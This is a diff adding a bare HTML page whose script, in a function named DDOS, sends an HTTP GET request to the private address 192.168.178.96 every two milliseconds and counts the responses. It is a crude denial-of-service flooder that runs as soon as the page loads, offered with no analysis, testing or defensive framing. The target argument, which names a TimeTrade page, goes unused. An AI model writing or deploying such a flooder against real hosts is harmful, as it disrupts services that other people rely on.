@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        let counter = 0;
+
+        function DDOS(target="http://192.168.178.96/TimeTrade/HTML/index.php") {
+            let ajax = new XMLHttpRequest();
+            ajax.open("GET", "http://192.168.178.96");
+            ajax.send();
+            ajax.addEventListener("load", () => {counter += 1; console.log(counter);});
+        }
+
+        setInterval(DDOS, 2);
+    </script>
+</body>
+</html>
